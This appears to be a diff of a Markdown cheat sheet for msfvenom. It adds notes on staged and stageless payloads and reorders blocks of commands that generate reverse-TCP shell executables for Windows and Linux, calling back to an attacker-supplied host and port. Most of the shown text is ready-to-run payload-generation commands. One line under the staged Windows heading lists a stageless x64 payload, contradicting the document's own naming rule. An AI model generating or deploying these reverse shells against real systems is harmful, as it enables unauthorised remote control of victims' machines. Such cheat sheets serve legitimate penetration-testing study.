@@ -13,11 +13,17 @@ Run
 msfvenom -l
 ```
 
+## Staged payloads: 
+Staged payloads are denoted with the use of a forward slash (/; e.g. windows/shell/reverse_tcp). Staged payloads send a small stager to the target, which connects back to the attacker and downloads the rest of the payload. Therefore, staged payloads need special payload listeners, such as multi/handler in Metasploit. Staged payloads are ideal in situations where you have limited shellcode space, most commonly in Buffer Overflows.
+
+## Stageless payloads:
+Stageless payloads are denoted with the use of an underscore (_; e.g. windows/shell_reverse_tcp). Stageless payloads send the entire payload to the target at once, and therefore don’t require the attacker to provide more data. That means we have a variety of listeners we can use, such as Netcat.
+
 # Non-Meterpreter Binaries
-## Staged Payloads for Windows:
+## Stageless Payloads for Linux:
 ```
-x86	msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
-x64	msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
+x86 	msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
+x64 	msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
 ```
 
 ## Stageless Payloads for Windows:
@@ -32,10 +38,10 @@ x86	msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > she
 x64 	msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
 ```
 
-## Stageless Payloads for Linux:
+## Staged Payloads for Windows:
 ```
-x86 	msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
-x64 	msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
+x86	msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
+x64	msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
 ```
 
 ## Web Payloads:
